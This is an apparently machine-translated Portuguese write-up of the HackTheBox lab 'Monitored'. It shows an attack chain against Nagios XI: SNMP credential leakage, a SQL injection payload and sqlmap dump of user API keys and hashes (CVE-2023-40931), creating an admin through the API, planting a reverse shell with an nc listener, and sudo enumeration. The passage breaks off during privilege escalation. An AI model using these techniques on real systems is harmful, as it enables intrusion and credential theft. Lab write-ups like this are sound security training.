---
title: "Monitored - HackTheBox"
date: 2024-01-16
published: true
lang: pt-BR
translation_key: "monitored-htb"
original_url: /monitored-htb
permalink: /pt-br/monitored-htb
---
# [](#intro)Introdução

No post de hoje, vamos resolver a máquina de 4 segundos da temporada, monitorada. Esta é uma máquina de dificuldade média cheia de coelho
furos, então precisamos prestar atenção ao seu ambiente para resolvê-lo. Vamos saltar para cima dele!

# [](#approach)Approach mindset

Para nossa mentalidade de abordagem, vamos separá-la como os seguintes passos:

1. Reconhecimento
2. Obtendo apoio
3. Enumeração do sistema
4. Aumento do privilégio


# # [](#step1-recon)Passo 1 - Reconhecimento

Começamos por enumerar as portas do sistema para ter uma sensação do que está em execução:

```bash
$ nmap -p- -T4 --min-rate 1000 -A -oN ports.nmap 10.129.37.231
Nmap scan report for 10.129.37.231
Host is up (0.13s latency).
Not shown: 65530 closed tcp ports (reset)
PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)
| ssh-hostkey: 
|   3072 61:e2:e7:b4:1b:5d:46:dc:3b:2f:91:38:e6:6d:c5:ff (RSA)
|   256 29:73:c5:a5:8d:aa:3f:60:a9:4a:a3:e5:9f:67:5c:93 (ECDSA)
|_  256 6d:7a:f9:eb:8e:45:c2:02:6a:d5:8d:4d:b3:a3:37:6f (ED25519)
80/tcp   open  http       Apache httpd 2.4.56
|_http-server-header: Apache/2.4.56 (Debian)
|_http-title: Did not follow redirect to https://nagios.monitored.htb/
389/tcp  open  ldap       OpenLDAP 2.2.X - 2.3.X
443/tcp  open  ssl/http   Apache httpd 2.4.56 ((Debian))
| ssl-cert: Subject: commonName=nagios.monitored.htb/organizationName=Monitored/stateOrProvinceName=Dorset/countryName=UK
| Not valid before: 2023-11-11T21:46:55
|_Not valid after:  2297-08-25T21:46:55
| tls-alpn: 
|_  http/1.1
|_http-server-header: Apache/2.4.56 (Debian)
|_ssl-date: TLS randomness does not represent time
|_http-title: Nagios XI
5667/tcp open  tcpwrapped
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.94%E=4%D=1/15%OT=22%CT=1%CU=30330%PV=Y%DS=2%DC=T%G=Y%TM=65A56AA
OS:8%P=x86_64-pc-linux-gnu)SEQ(SP=102%GCD=1%ISR=108%TI=Z%CI=Z%II=I%TS=9)SEQ
OS:(SP=102%GCD=1%ISR=108%TI=Z%CI=Z%II=I%TS=A)OPS(O1=M53CST11NW7%O2=M53CST11
OS:NW7%O3=M53CNNT11NW7%O4=M53CST11NW7%O5=M53CST11NW7%O6=M53CST11)WIN(W1=FE8
OS:8%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN(R=Y%DF=Y%T=40%W=FAF0%O=M53
OS:CNNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(
OS:R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F
OS:=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T
OS:=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RI
OS:D=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)

Network Distance: 2 hops
Service Info: Host: nagios.monitored.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 80/tcp)
HOP RTT       ADDRESS
1   131.38 ms 10.10.14.1
2   131.45 ms 10.129.37.231

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon Jan 15 17:26:00 2024 -- 1 IP address (1 host up) scanned in 115.23 seconds
```
A partir disso, encontramos um monte de serviços, mas nenhum deles é muito interessante além da página web. Para acessar o serviço web,
precisamos adicionar a linha `<machine-ip> nagios.monitored.htb` ao `/etc/hosts`. Depois disso, podemos acessá-lo com nosso navegador:

<img src="../figs/monitored1.png" alt="landing page">

Se clicarmos em "Access Nagios", seremos trazidos para uma página de login, no `/nagiosxi/login.php`. Tentei forçá-lo e...
Envie as cargas de injeção SQL, mas sem sucesso. Sabemos que este serviço se chama Nagios XI, então meu próximo passo foi
procurar vulnerabilidades comuns girando em torno dele. Em uma busca rápida, encontramos [este blog](https://outpost24.com/blog/nagios-xi-vulnerabilities/) sobre Nagios XI CVEs. Um que se destaca para mim é o primeiro, CVE-2023-40931. Lê-se:

> Nagios XI apresenta “Annunciamento Banners”, que pode opcionalmente ser reconhecido pelos usuários. O endpoint para este recurso é vulnerável a um ataque SQL Injection.
>
> Quando um usuário reconhece um banner, uma solicitação POST é enviada para `/nagiosxi/admin/banner_message-ajaxhelper.php` com os dados POST consistindo da ação pretendida e ID da mensagem – `action=acknowledge banner message&id=3`.
>
> O parâmetro ID é assumido para ser confiável, mas vem diretamente do cliente sem higienização. Isso leva a uma Injeção SQL onde um usuário autenticado com privilégios baixos ou nulos pode recuperar dados sensíveis, como a partir da tabela `xi_session` e `xi_users` contendo dados como e-mails, nomes de usuário, senhas hashed, tokens de API e tickets de infraestrutura.

Como podemos ver, essa vulnerabilidade só funciona se tivermos pelo menos acesso a um usuário de baixo privilégio. Precisamos de uma forma de o testar.

Eu corri `ffuf -u http://nagios.monitored.htb/nagiosxi/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-1.0.txt` para enumerar endpoints e isso é o que eu tenho:

```bash
help                    [Status: 301, Size: 338, Words: 20, Lines: 10, Duration: 139ms]
mobile                  [Status: 301, Size: 340, Words: 20, Lines: 10, Duration: 136ms]
images                  [Status: 301, Size: 340, Words: 20, Lines: 10, Duration: 137ms]
about                   [Status: 301, Size: 339, Words: 20, Lines: 10, Duration: 135ms]
admin                   [Status: 301, Size: 339, Words: 20, Lines: 10, Duration: 129ms]
reports                 [Status: 301, Size: 341, Words: 20, Lines: 10, Duration: 136ms]
includes                [Status: 301, Size: 342, Words: 20, Lines: 10, Duration: 130ms]
sounds                  [Status: 403, Size: 286, Words: 20, Lines: 10, Duration: 134ms]
account                 [Status: 301, Size: 341, Words: 20, Lines: 10, Duration: 136ms]
tools                   [Status: 301, Size: 339, Words: 20, Lines: 10, Duration: 132ms]
backend                 [Status: 301, Size: 341, Words: 20, Lines: 10, Duration: 136ms]
config                  [Status: 301, Size: 340, Words: 20, Lines: 10, Duration: 134ms]
views                   [Status: 301, Size: 339, Words: 20, Lines: 10, Duration: 136ms]
db                      [Status: 301, Size: 336, Words: 20, Lines: 10, Duration: 137ms]
api                     [Status: 301, Size: 337, Words: 20, Lines: 10, Duration: 134ms]
terminal                [Status: 200, Size: 5215, Words: 1247, Lines: 124, Duration: 204ms]
```
À primeira vista, o único endpoint interessante é `terminal`, que parece ser um acesso terminal ao servidor.

<img src="../figs/monitored2.png" alt="terminal endpoint">

No entanto, isso não é útil a menos que tenhamos credenciais para login.

Vamos afastar-nos um pouco. Encontramos alguns vetores interessantes, mas talvez precisemos
Encontra as credenciais. Segundo a documentação da Nagios XI, o serviço parece ser um sistema de monitoramento de rede.
Com um pouco de pesquisa, encontramos [esta página](https://www.nagios.com/solutions/snmp-monitoring/) afirmando que Nagios XI fornece monitoramento completo do SNMP (Simple Network Message Protocol). SNMP roda na porta UDP 161/162, e isso não foi mostrado em nosso primeiro
Sondagem Nmap. Isso é porque não especificamos para realizar uma varredura UDP. Vamos repetir o Nmap com isso em mente.

```bash
$ sudo nmap -sU -T4 -oN udp.nmap 10.129.37.231
Warning: 10.129.37.231 giving up on port because retransmission cap hit (6).
Nmap scan report for nagios.monitored.htb (10.129.37.231)
Host is up (0.14s latency).
Not shown: 984 closed udp ports (port-unreach)
PORT      STATE         SERVICE
68/udp    open|filtered dhcpc
123/udp   open          ntp
161/udp   open          snmp
162/udp   open|filtered snmptrap
3702/udp  open|filtered ws-discovery
16697/udp open|filtered unknown
16838/udp open|filtered unknown
17836/udp open|filtered unknown
21167/udp open|filtered unknown
34038/udp open|filtered unknown
37843/udp open|filtered unknown
40622/udp open|filtered unknown
41524/udp open|filtered unknown
43967/udp open|filtered unknown
54281/udp open|filtered unknown
65024/udp open|filtered unknown

# Nmap done at Mon Jan 15 18:09:22 2024 -- 1 IP address (1 host up) scanned in 1065.19 seconds
```
Como podemos ver, o serviço SNMP está funcionando na porta 161. Podemos nos referir a [este](https://book.hacktricks.xyz/network-services-pentesting/pentesting-snmp) Página de HackTricks sobre a enumeração SNMP, que fornece uma boa visão sobre como usar `snmpwalk`. Isto é o que podemos
executar:

```bash
$ snmpwalk -v 1 -c public 10.129.37.231 system | tee snmpwalk.txt
SNMPv2-MIB::sysDescr.0 = STRING: Linux monitored 5.10.0-27-amd64 #1 SMP Debian 5.10.205-2 (2023-12-31) x86_64
SNMPv2-MIB::sysObjectID.0 = OID: NET-SNMP-MIB::netSnmpAgentOIDs.10
DISMAN-EVENT-MIB::sysUpTimeInstance = Timeticks: (313660) 0:52:16.60
SNMPv2-MIB::sysContact.0 = STRING: Me <root@monitored.htb>
SNMPv2-MIB::sysName.0 = STRING: monitored
SNMPv2-MIB::sysLocation.0 = STRING: Sitting on the Dock of the Bay
SNMPv2-MIB::sysServices.0 = INTEGER: 72
SNMPv2-MIB::sysORLastChange.0 = Timeticks: (1581) 0:00:15.81
SNMPv2-MIB::sysORID.1 = OID: SNMP-FRAMEWORK-MIB::snmpFrameworkMIBCompliance
SNMPv2-MIB::sysORID.2 = OID: SNMP-MPD-MIB::snmpMPDCompliance
SNMPv2-MIB::sysORID.3 = OID: SNMP-USER-BASED-SM-MIB::usmMIBCompliance
SNMPv2-MIB::sysORID.4 = OID: SNMPv2-MIB::snmpMIB
SNMPv2-MIB::sysORID.5 = OID: SNMP-VIEW-BASED-ACM-MIB::vacmBasicGroup
SNMPv2-MIB::sysORID.6 = OID: TCP-MIB::tcpMIB
SNMPv2-MIB::sysORID.7 = OID: UDP-MIB::udpMIB
[...snip...]
```
A saída é enorme e contém muita informação. Depois de terminar, podemos usar `grep` no arquivo `snmpwalk.txt` para ver
Se conseguirmos encontrar alguma coisa útil:

```bash
$ cat snmpwalk.txt | grep password
$ cat snmpwalk.txt | grep username
$ cat snmpwalk.txt | grep user
HOST-RESOURCES-MIB::hrSWRunParameters.840 = STRING: "-q --background=/var/run/shellinaboxd.pid -c /var/lib/shellinabox -p 7878 -u shellinabox -g shellinabox --user-css Black on Whit"
HOST-RESOURCES-MIB::hrSWRunParameters.842 = STRING: "-q --background=/var/run/shellinaboxd.pid -c /var/lib/shellinabox -p 7878 -u shellinabox -g shellinabox --user-css Black on Whit"
HOST-RESOURCES-MIB::hrSWInstalledName.1 = STRING: "adduser_3.118+deb11u1_all"
HOST-RESOURCES-MIB::hrSWInstalledName.812 = STRING: "xdg-user-dirs_0.17-2_amd64"
```
As linhas no comando `| grep user` mostram parâmetros para um serviço ou processo em execução. Neste caso, eles parecem estar relacionados ao shellabox, um emulador de terminal baseado na web. Podemos tentar identificar o uso da shell por greping `/bin/bash`:

```bash
$ cat snmpwalk.txt | grep /bin/bash
HOST-RESOURCES-MIB::hrSWRunPath.1383 = STRING: "/bin/bash"
HOST-RESOURCES-MIB::hrSWRunParameters.588 = STRING: "-c sleep 30; sudo -u svc /bin/bash -c /opt/scripts/check_host.sh svc XjH7VCehowpR1xZB "
HOST-RESOURCES-MIB::hrSWRunParameters.1382 = STRING: "-u svc /bin/bash -c /opt/scripts/check_host.sh svc XjH7VCehowpR1xZB"
```
Podemos ver que o parâmetro STRING parece estar definindo um usuário `svc` para executar o comando `check_host.sh` passando o nome de usuário `svc` e o que parece ser uma senha `XjH7VCehowpR1xZB`. Podemos tentar fazer login com essas credenciais no `/nagiosxi/login.php`
Endpoint do serviço web, mas isso não vai funcionar:

<img src="../figs/monitored3.png" alt="failed login attempt">

No entanto, se tentarmos fazer login com o nome de usuário `svc` e uma senha errada, a mensagem de erro é diferente:

<img src="../figs/monitored4.png" alt="failed login attempt 2">

Indicando que a senha encontrada no protocolo SNMP está correta, mas o login do `svc` está desativado (pelo menos neste endpoint).


## [](#step3-foothold)Passo 2 - Obtendo apoio

De volta à estaca zero, precisamos de outra forma de autenticar. Depois de ler muitas documentações, descobri que o Nagios XI usa API Keys para o usuário realizar ações dentro dele. Se esse for o caso, podemos encontrar uma maneira de recuperar `svc` API chave ou token autenticando em outro lugar. Vamos tentar encontrar um ponto final de API onde possamos nos autenticar. Para fazer isso, usaremos `ffuf` novamente, mas agora no ponto final `/nagiosxi/api` que encontramos antes.

```bash
$ ffuf -u http://10.129.37.231/nagiosxi/api/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/common-api-endpoints-mazen160.txt

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : https://nagios.monitored.htb/nagiosxi/api/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/Web-Content/common-api-endpoints-mazen160.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

v1                      [Status: 301, Size: 340, Words: 20, Lines: 10, Duration: 133ms]
:: Progress: [175/175] :: Job [1/1] :: 75 req/sec :: Duration: [0:00:02] :: Errors: 0 ::
```
Aceder ao `/nagiosxi/api/v1` nos dá uma mensagem `error	"No request was made"`, indicando que esta é uma API v1. Agora, rodamos `ffuf` novamente, mas com este novo endpoint:

```bash
$ ffuf -u https://nagios.monitored.htb/nagiosxi/api/v1/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/common-api-endpoints-mazen160.txt

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : https://nagios.monitored.htb/nagiosxi/api/v1/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/Web-Content/common-api-endpoints-mazen160.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

authtoken               [Status: 200, Size: 32, Words: 4, Lines: 2, Duration: 262ms]
3.0                     [Status: 200, Size: 32, Words: 4, Lines: 2, Duration: 267ms]
7.0                     [Status: 200, Size: 32, Words: 4, Lines: 2, Duration: 274ms]
accounts                [Status: 200, Size: 32, Words: 4, Lines: 2, Duration: 278ms]
0                       [Status: 200, Size: 32, Words: 4, Lines: 2, Duration: 276ms]
1.0                     [Status: 200, Size: 32, Words: 4, Lines: 2, Duration: 276ms]
9                       [Status: 200, Size: 32, Words: 4, Lines: 2, Duration: 280ms]
all                     [Status: 200, Size: 32, Words: 4, Lines: 2, Duration: 297ms]
billing                 [Status: 200, Size: 32, Words: 4, Lines: 2, Duration: 293ms]
8.0                     [Status: 200, Size: 32, Words: 4, Lines: 2, Duration: 299ms]
1                       [Status: 200, Size: 32, Words: 4, Lines: 2, Duration: 248ms]
2                       [Status: 200, Size: 32, Words: 4, Lines: 2, Duration: 264ms]
bugs                    [Status: 200, Size: 32, Words: 4, Lines: 2, Duration: 240ms]
4.0                     [Status: 200, Size: 32, Words: 4, Lines: 2, Duration: 255ms]
3                       [Status: 200, Size: 32, Words: 4, Lines: 2, Duration: 257ms]
[...snip...]
```
Todos eles dando um código de estado 200 indica que o servidor está apenas nos enviando algumas mensagens sobre o pedido. Precisamos de mais informações sobre estas mensagens. Para isso, vamos executar `ffuf` em modo silencioso e redirecionar a saída para `api-endpoints.txt`.

```bash
$ ffuf -u https://nagios.monitored.htb/nagiosxi/api/v1/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/common-api-endpoints-mazen160.txt -s > api-endpoints.txt
```
Note que a maioria das mensagens são: `Message {"error":"No API Key provided"}`. Dito isto, escreveremos um script python para ver se há outras mensagens:

```python
import requests
import sys
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def open_wordlist(path):
    wordlist = []
    with open(path, 'r') as file:
        for line in file:
            wordlist.append(line.strip())
    return wordlist

def main(args):
    url = args[0]
    wordlist_file = args[1]
    wordlist = open_wordlist(wordlist_file)
    for word in wordlist:
        res = requests.get(url + word, verify=False)
        if 'No API Key provided' not in res.text:
            print(f"Message {res.text} at endpoint {url+word}\n")

if __name__ == '__main__':
    argv = sys.argv
    if len(argv) != 3:
        print("Usage: fetch-req-msg.py <URL> <WORDLIST>")
        exit(0)
    main(argv[1:])
```
Estamos filtrando todas as mensagens que contêm string `No API Key provided` e imprimindo as mensagens com uma mensagem diferente. Executando o script produz:

```bash
$ python fetch-req-msg.py https://nagios.monitored.htb/nagiosxi/api/v1/ api-endpoints.txt 
Message {"error":"No request was made"}
 at endpoint https://nagios.monitored.htb/nagiosxi/api/v1/0

Message {"error":"You can only use POST with authenticate."}
 at endpoint https://nagios.monitored.htb/nagiosxi/api/v1/authenticate
```
Notamos um endpoint de autenticação presente que não requer uma chave API. Depois de um pouco de pesquisa, encontrei [este tópico ](https://support.nagios.com/forum/viewtopic.php?f=16&t=58783) neste endpoint, onde afirma que podemos autenticar via cURL usando
`curl -XPOST -k -L 'http://YOURXISERVER/nagiosxi/api/v1/authenticate?pretty=1' -d 'username=nagiosadmin&password=YOURPASS&valid_min=5'`. Podemos tentar autenticar com as credenciais que encontramos usando snmpwalk:

```bash
$ curl -XPOST -k -L 'https://nagios.monitored.htb/nagiosxi/api/v1/authenticate?pretty=1' -d 'username=svc&password=XjH7VCehowpR1xZB&valid_min=1000'
{
    "username": "svc",
    "user_id": "2",
    "auth_token": "080377be1a39ccd6c8126a03a3248e9046a1e6dd",
    "valid_min": 1000,
    "valid_until": "Wed, 17 Jan 2024 12:57:22 -0500"
}
```
A partir disso, temos um auth token, que pode ser mais do que suficiente para testar e abusar CVE-2023-40931. Dando uma olhada no CVE, vemos que o endpoint afetado é `/nagiosxi/admin/banner_message-ajaxhelper.php` e devemos enviar uma solicitação POST. Com o BurpSuite, isto torna-se fácil:

<img src="../figs/monitored5.png" alt="SQLi endpoint request">

Ok, a sessão cronometrou significa que não estamos mais autenticados. Tentei passar o token de autenticação como um cabeçalho de autenticação, mas isso não funcionou. Eu também tentei enviá-lo no corpo do pedido com os nomes `auth_token` e `token`, que
Também não funcionou. Finalmente, depois de algumas tentativas, tentei mudar o pedido para um pedido GET, e isso aconteceu:

<img src="../figs/monitored6.png" alt="SQLi endpoint request">

Está bem! Estamos a chegar a algum lado. Tentei uma injeção SQL simples no parâmetro ID: `id=3'XOR(if(now()=sysdate(),sleep(5*5),0))OR'` e a resposta foi intrigante:


<img src="../figs/monitored7.png" alt="SQLi endpoint request">

A mensagem de erro indica que podemos ter uma injeção SQL aqui. Vamos executar SQLMap para testá-lo. Uma coisa que notei é que o auth token só pode ser usado uma vez por solicitação. Isso significa que precisaremos de um comando para passar um auth token diferente para cada solicitação SQLMap. Para isso, usaremos este comando `curl -ksX POST https://nagios.monitored.htb/nagiosxi/api/v1/authenticate -d "username=svc&password=XjH7VCehowpR1xZB&valid_min=500" | awk -F'"' '{print$12}'` para limpar a saída para ser apenas o próprio token, e então executar SQLMap com `-T xi_users`, que é a tabela em Nagios XI que contém informações dos usuários.

```bash
$ sqlmap -u "https://nagios.monitored.htb/nagiosxi/admin/banner_message-ajaxhelper.php?action=acknowledge_banner_message&id=3&token=`curl -ksX POST https://nagios.monitored.htb/nagiosxi/api/v1/authenticate -d "username=svc&password=XjH7VCehowpR1xZB&valid_min=500" | awk -F'"' '{print$12}'`" --level 5 --risk 3 -p id --batch -D nagiosxi --dump -T xi_users
        ___
       __H__                                                                                                             
 ___ ___[)]_____ ___ ___  {1.7.12#stable}                                                                                
|_ -| . [.]     | .'| . |                                                                                                
|___|_  [(]_|_|_|__,|  _|                                                                                                
      |_|V...       |_|   https://sqlmap.org                                                                             

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 22:38:17 /2024-01-16/

[22:38:17] [INFO] testing connection to the target URL
you have not declared cookie(s), while server wants to set its own ('nagiosxi=sncb97hqvcq...s60dv5asic'). Do you want to use those [Y/n] Y
[22:38:18] [INFO] checking if the target is protected by some kind of WAF/IPS
[22:38:18] [INFO] testing if the target URL content is stable
[22:38:19] [INFO] target URL content is stable
[22:38:20] [INFO] heuristic (basic) test shows that GET parameter 'id' might be injectable (possible DBMS: 'MySQL')
[22:38:20] [INFO] testing for SQL injection on GET parameter 'id'
it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] Y
[22:38:20] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[22:38:20] [WARNING] reflective value(s) found and filtering out
[...snip...]
Database: nagiosxi
Table: xi_users
[2 entries]
+---------+---------------------+----------------------+------------------------------------------------------------------+---------+--------------------------------------------------------------+-------------+------------+------------+-------------+-------------+--------------+--------------+------------------------------------------------------------------+----------------+----------------+----------------------+
| user_id | email               | name                 | api_key                                                          | enabled | password                                                     | username    | created_by | last_login | api_enabled | last_edited | created_time | last_attempt | backend_ticket                                                   | last_edited_by | login_attempts | last_password_change |
+---------+---------------------+----------------------+------------------------------------------------------------------+---------+--------------------------------------------------------------+-------------+------------+------------+-------------+-------------+--------------+--------------+------------------------------------------------------------------+----------------+----------------+----------------------+
| 1       | admin@monitored.htb | Nagios Administrator | IudGPHd9pEKiee9MkJ7ggPD89q3YndctnPeRQOmS2PQ7QIrbJEomFVG6Eut9CHLL | 1       | $2a$10$825c1eec29c150b118fe7unSfxq80cf7tHwC0J0BG2qZiNzWRUx2C | nagiosadmin | 0          | 1701931372 | 1           | 1701427555  | 0            | 0            | IoAaeXNLvtDkH5PaGqV2XZ3vMZJLMDR0                                 | 5              | 0              | 1701427555           |
| 2       | svc@monitored.htb   | svc                  | 2huuT2u2QIPqFuJHnkPEEuibGJaJIcHCFDpDb29qSFVlbdO4HJkjfg2VpDNE3PEK | 0       | $2a$10$12edac88347093fcfd392Oun0w66aoRVCrKMPBydaUfgsgAOUHSbK | svc         | 1          | 1699724476 | 1           | 1699728200  | 1699634403   | 1705449034   | 6oWBPbarHY4vejimmu3K8tpZBNrdHpDgdUEs5P2PFZYpXSuIdrRMYgk66A0cjNjq | 1              | 8              | 1699697433           |
+---------+---------------------+----------------------+------------------------------------------------------------------+---------+--------------------------------------------------------------+-------------+------------+------------+-------------+-------------+--------------+--------------+------------------------------------------------------------------+----------------+----------------+----------------------+
```
Nos dando acesso à chave e senha da API do administrador. Usando [Hash Analyzer](https://www.tunnelsup.com/hash-analyzer/) podemos ver que a senha está usando o hash bcrypt. Tentei encontrar uma correspondência com John, o Estripador, mas sem sucesso. Isto fez-me pensar... Talvez possamos usar a chave de API do administrador para criar outra conta de administrador dentro do Nagios XI, então faça login com ele.
Novamente, com um pouco de pesquisa, podemos encontrar [este tópico](https://support.nagios.com/forum/viewtopic.php?f=16&t=42923), onde diz
podemos criar um accout com este comando cURL `curl -XPOST "http://x.x.x.x/nagiosxi/api/v1/system/user?apikey=LTltbjobR0X3V5ViDIitYaI8hjsjoFBaOcWYukamF7oAsD8lhJRvSPWq8I3PjTf7&pretty=1" -d "username=jmcdouglas&password=test&name=Jordan%20McDouglas&email=jmcdouglas@localhost"`. No entanto, isso criará um usuário normal. Precisamos de um usuário administrativo. Então, eu encontrei [este](https://www.exploit-db.com/exploits/44969) em exploit-db, que é uma exploração completamente diferente, mas tem estas linhas:

```python
  def try_add_admin(key, username, passwd)
    vprint_status "STEP 3: trying to add admin user with key #{key}"
    res = send_request_cgi({
      'uri'=> "/nagiosxi/api/v1/system/user",
      'method' => 'POST',
      'ctype' => 'application/x-www-form-urlencoded',
      'vars_get' => {
        'apikey' => key,
        'pretty' => 1
      },
      'vars_post' =>{
        'username'   => username,
        'password'   => passwd,
        'name'       => rand_text_alpha(rand(5) + 5),
        'email'      =>"#{username}@localhost",
        'auth_level' =>'admin',
        'force_pw_change' => 0
      }
    })
```
Note que ele tenta criar/adicionar uma conta de administrador, e passa um parâmetro `auth_level=admin`. Vamos combinar cURL com esta informação e tentar criar esta conta de administrador:

```bash
$ curl -k -L -XPOST "https://nagios.monitored.htb/nagiosxi/api/v1/system/user?apikey=IudGPHd9pEKiee9MkJ7ggPD89q3YndctnPeRQOmS2PQ7QIrbJEomFVG6Eut9CHLL&pretty=1" -d "username=mula&password=mula&name=mula&email=mula@localhost&auth_level=admin"
{
    "success": "User account mula was added successfully!",
    "user_id": 6
}
```
E agora tentamos entrar no navegador:

<img src="../figs/monitored8.png" alt="login successful">

Está bem! Agora estamos dentro do Nagios XI e conectado como administrador:

<img src="../figs/monitored9.png" alt="admin panel">

Depois de vasculhar o aplicativo e procurar por sua documentação, encontrei [este tópico](https://documentation.sysaid.com/docs/configure-nagios-xi-integration) que explica como se pode adicionar e executar comandos dentro do Nagios XI. Precisamos configurar um novo comando no Configurar > Gerenciador de Configuração do Núcleo > Comandos > Adicionar Novo e podemos passar qualquer comando que quisermos. Muito bem, vamos passar-lhe uma concha inversa, então!

<img src="../figs/monitored10.png" alt="admin panel">

Para executar o comando, vamos para Serviços (painel esquerdo) > Adicionar Novo e dentro do comando check dropdown input, selecionamos rev shell. Depois clicamos no Comando de Verificação de Execução. Não se esqueça de deixar seu netcat ouvir antes de apertar este botão!

```bash
$ nc -lnvp 4242
Connection from 10.129.37.52:54666
bash: cannot set terminal process group (14645): Inappropriate ioctl for device
bash: no job control in this shell
nagios@monitored:~$ whoami
whoami
nagios
nagios@monitored:~$ ls       
ls
cookie.txt
user.txt
nagios@monitored:~$ cat user.txt
cat user.txt
[...redacted...]
```
A dar-nos o shell do usuário.

# # [](#step3-crafting-the-attack)Passo 3 - enumeração do sistema

Meu primeiro comando de enumeração foi `sudo -l` e a saída me impressionou:

```bash
nagios@monitored:~$ sudo -l
sudo -l
Matching Defaults entries for nagios on localhost:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User nagios may run the following commands on localhost:
    (root) NOPASSWD: /etc/init.d/nagios start
    (root) NOPASSWD: /etc/init.d/nagios stop
    (root) NOPASSWD: /etc/init.d/nagios restart
    (root) NOPASSWD: /etc/init.d/nagios reload
    (root) NOPASSWD: /etc/init.d/nagios status
    (root) NOPASSWD: /etc/init.d/nagios checkconfig
    (root) NOPASSWD: /etc/init.d/npcd start
    (root) NOPASSWD: /etc/init.d/npcd stop
    (root) NOPASSWD: /etc/init.d/npcd restart
    (root) NOPASSWD: /etc/init.d/npcd reload
    (root) NOPASSWD: /etc/init.d/npcd status
    (root) NOPASSWD: /usr/bin/php
        /usr/local/nagiosxi/scripts/components/autodiscover_new.php *
    (root) NOPASSWD: /usr/bin/php /usr/local/nagiosxi/scripts/send_to_nls.php *
    (root) NOPASSWD: /usr/bin/php
        /usr/local/nagiosxi/scripts/migrate/migrate.php *
    (root) NOPASSWD: /usr/local/nagiosxi/scripts/components/getprofile.sh
    (root) NOPASSWD: /usr/local/nagiosxi/scripts/upgrade_to_latest.sh
    (root) NOPASSWD: /usr/local/nagiosxi/scripts/change_timezone.sh
    (root) NOPASSWD: /usr/local/nagiosxi/scripts/manage_services.sh *
    (root) NOPASSWD: /usr/local/nagiosxi/scripts/reset_config_perms.sh
    (root) NOPASSWD: /usr/local/nagiosxi/scripts/manage_ssl_config.sh *
    (root) NOPASSWD: /usr/local/nagiosxi/scripts/backup_xi.sh *
```
Tantas possibilidades diferentes aqui! Depois de olhar para os arquivos `.sh`, eu descobri que `manage_services.sh` foi usado para iniciar, parar e verificar o estado de npcd. Aqui está a saída do status do npcd:

```bash
nagios@monitored:~$ sudo /usr/local/nagiosxi/scripts/manage_services.sh status npcd
<cal/nagiosxi/scripts/manage_services.sh status npcd
● npcd.service - Nagios Process Control Daemon
     Loaded: loaded (/etc/systemd/system/npcd.service; enabled; vendor preset: enabled)
     Active: active (running) since Tue 2024-01-16 17:29:58 EST; 4h 1min ago
   Main PID: 727 (npcd)
      Tasks: 1 (limit: 4661)
     Memory: 276.0K
        CPU: 228ms
     CGroup: /system.slice/npcd.service
             └─727 /usr/local/nagios/bin/npcd -f /usr/local/nagios/etc/pnp/npcd.cfg
```
Como podemos ver, o `npcd.service` chama `/usr/share/nagios/bin/npcd` ao executar, e também temos privilégios de escrita neste diretório e no arquivo:

```bash
nagios@monitored:~$ ls -la /usr/local/nagios/bin
ls -la /usr/local/nagios/bin
total 2192
drwxr-xr-x 2 nagios nagios    4096 Nov  9 10:43 .
drwxr-xr-x 8 root   root      4096 Nov  9 10:40 ..
-rwxrwxr-- 1 nagios nagios  717648 Nov  9 10:40 nagios
-rwxrwxr-- 1 nagios nagios   43648 Nov  9 10:40 nagiostats
-rwxrwxr-- 1 nagios nagios 1043688 Nov  9 10:42 ndo.so
